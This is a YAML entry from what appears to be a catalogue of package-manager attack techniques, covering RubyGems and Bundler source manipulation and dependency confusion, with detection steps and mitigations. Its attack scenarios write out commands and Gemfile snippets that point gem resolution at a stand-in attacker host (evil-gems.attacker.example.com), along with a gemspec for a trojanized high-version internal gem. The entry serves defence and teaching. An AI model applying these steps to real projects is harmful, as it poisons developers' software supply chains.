---
name: "RubyGems Source Manipulation"
packageManager: "gem"
slug: "gem-source-manipulation"
category: "Source Manipulation"
severity: "high"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "RubyGems resolves packages from configurable source repositories, and its `gem sources` command can prepend or append a source. Bundler gives highest priority to a source explicitly attached to a gem, then to a parent dependency's source, and finally to the global source. Multiple global Bundler sources are prioritized from last to first and are deprecated. An attacker who can change source configuration or a Gemfile can therefore redirect package resolution to a server they control."
descriptionCitations: [1, 2]
prerequisites:
  - "Write access to the victim's Gemfile, .gemrc, or ability to influence gem source configuration"
  - "A malicious gem server hosting a trojanized version of a target gem"
  - "For dependency confusion: knowledge of internal gem names used by the target organization"
prerequisitesCitations: [1, 2]
attackScenarios:
  - title: "Adding a Malicious Gem Source"
    description: "An attacker with access to a developer's environment prepends a rogue gem source that hosts a matching package. A later RubyGems install can select a candidate from that configured source according to source order and version constraints."
    citations: [1, 2]
    commands:
      - label: "Add a malicious gem source globally"
        code: |
          gem sources --prepend https://evil-gems.attacker.example.com/
          gem sources --list
          # Output:
          # *** CURRENT SOURCES ***
          # https://evil-gems.attacker.example.com/
          # https://rubygems.org/
        language: "bash"
      - label: "Install a gem that resolves from the malicious source"
        code: |
          # The prepended source offers a matching nokogiri candidate.
          gem install nokogiri
        language: "bash"
  - title: "Gemfile Multi-Source Dependency Confusion"
    description: "An attacker modifies a project's Gemfile to add a second global source or explicitly bind a gem to a malicious source. Bundler warns about multiple global sources and prioritizes them last to first; an explicit source block directly assigns its listed gems to that source."
    citations: [1, 2]
    commands:
      - label: "Gemfile with multiple sources (vulnerable pattern)"
        code: |
          # Gemfile
          source "https://rubygems.org"
          source "https://evil-gems.attacker.example.com"

          # These gems could resolve from EITHER source
          gem "rails"
          gem "internal-auth-lib"  # Internal gem name targeted for confusion
        language: "ruby"
      - label: "Attacker-injected explicit source binding"
        code: |
          # Gemfile - source block pattern
          source "https://rubygems.org"

          # Attacker-injected source block
          source "https://evil-gems.attacker.example.com" do
            gem "internal-auth-lib"
          end
        language: "ruby"
      - label: "Attacker publishes a higher version of an internal gem"
        code: |
          # On the attacker's gem server, publish:
          Gem::Specification.new do |s|
            s.name    = "internal-auth-lib"
            s.version = "99.0.0"
            s.summary = "Authentication library"
            s.authors = ["attacker"]
            s.files   = ["lib/internal-auth-lib.rb"]
            # lib/internal-auth-lib.rb contains malicious code
          end
        language: "ruby"
detection:
  - title: "Audit configured gem sources"
    description: "List all globally configured gem sources to check for unexpected or untrusted repositories."
    citations: [1, 2]
    commands:
      - code: "gem sources --list"
        language: "bash"
  - title: "Audit Gemfile for multiple sources"
    description: "Review the project's Gemfile for multiple source declarations and ensure gems are pinned to specific sources using source blocks."
    citations: [1, 2]
    commands:
      - code: "grep -n 'source ' Gemfile"
        language: "bash"
  - title: "Check resolved sources in Gemfile.lock"
    description: "Inspect Gemfile.lock to verify which source each gem was resolved from."
    citations: [1, 2]
    commands:
      - code: "grep -B1 'remote:' Gemfile.lock"
        language: "bash"
mitigation:
  - "Use only trusted gem sources and remove any unknown sources with gem sources --remove"
  - "Pin gems to specific sources using Bundler source blocks in the Gemfile"
  - "Use one global Bundler source and bind every additional trusted source to named gems with source blocks"
  - "For internal gems, use a private gem server and restrict resolution with source blocks"
  - "Regularly audit Gemfile.lock to verify gems were resolved from expected sources"
  - "Configure an internal gem proxy or source block so private names cannot fall back to an untrusted public source"
mitigationCitations: [1, 2]
references:
  - title: "Bundler - Gemfile Source Documentation"
    url: "https://bundler.io/man/gemfile.5.html"
  - title: "RubyGems Command Reference - gem sources"
    url: "https://guides.rubygems.org/command-reference/#gem-sources"
created: 2026-04-02
updated: 2026-10-14
---
